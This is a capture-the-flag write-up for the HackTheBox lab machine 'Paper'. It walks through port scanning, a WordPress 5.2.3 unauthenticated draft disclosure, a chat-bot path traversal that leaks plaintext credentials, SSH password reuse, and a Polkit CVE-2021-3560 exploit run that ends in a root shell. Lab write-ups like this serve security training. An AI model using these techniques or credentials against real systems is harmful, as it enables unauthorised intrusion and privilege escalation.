---
description: Paper box from HackTheBox write up.
password: d7c2fceac37528a07e5816f1d072d430
---

# Paper

## Nmap scan

Time for the typical full ports basic Nmap scan and a more detailed one once we know what is open:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 1000 10.10.11.143    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 06:12 EDT
Nmap scan report for 10.10.11.143
Host is up (0.055s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 30.77 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80,443 -sC -sV 10.10.11.143
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 06:13 EDT
Nmap scan report for 10.10.11.143
Host is up (0.051s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds
```

Looking at the open ports I think we can go for the webpage first.

## HTTP server

We are welcomed by an Apache test webpage, the thing is that Gobuster did not find anything. I tried Nikto to see if it finds something:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Paper]
└─$ nikto -host http://10.10.11.143/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.143
+ Target Hostname:    10.10.11.143
+ Target Port:        80
+ Start Time:         2022-05-31 06:55:29 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-backend-server' found, with contents: office.paper
...
```

That uncommon header `office.paper` is interesting, I tried that as domain to see if there are virtual hosts in place and I was able to access a Wordpress application.

### Wordpress

The Wordpress version is 5.2.3 and I found this comment in one of the posts:

```
Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
```

Researching a bit I stumbled with this: [https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/](https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/){:target="_blank"} which talk about a vulnerability in this Wordpress version that allows an attacker to get secret contents just by adding `?static=1` to the URL. This is the result:

```
...
# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.
...
```

Cool, we got another virtual host and also a way of registering to the chat application hosted there, let's add the domain to our `hosts` file and let's see how it goes.


### Rocket Chat

After registering a user we can explore this chat service a bit. Looks like there is a bot that let us get files from the system, in theory it only allow us to get file from inside a certain folder but is pretty easy to bypass using relative paths: `../something`. We can't inject command though.

Exploring the folder a bit I was able to leak the bot environment variables the with `../hubot/.env`. Inside that file we have credentials for the bot account: `recyclops:Queenofblad3s!23`, the problem is that the bot can't access the web interface and the API looks like is only reachable from localhost. The thing is... looking at the directory listing we see the user in the machine: `dwight` so maybe it likes to reuse passwords.

I tried `dwight:Queenofblad3s!23` as credentials for the SSH service and I got access!

## In the machine as dwight

To be honest this part was pretty fast. After some basic enumeration I launched Linpeas and immediately CVE-2021-3560 appeared as vector, I used this PoC: [https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation){:target="_blank"}:

```bash
[dwight@paper meh]$ ./CVE-2021-3560.sh -p=123

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username secnigma...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username secnigma  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - secnigma
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
[dwight@paper meh]$ su - secnigma
Password: 
[secnigma@paper ~]$ sudo bash
[sudo] password for secnigma: 
[root@paper secnigma]#
```

The `root` flag is under `/root/root.txt`.
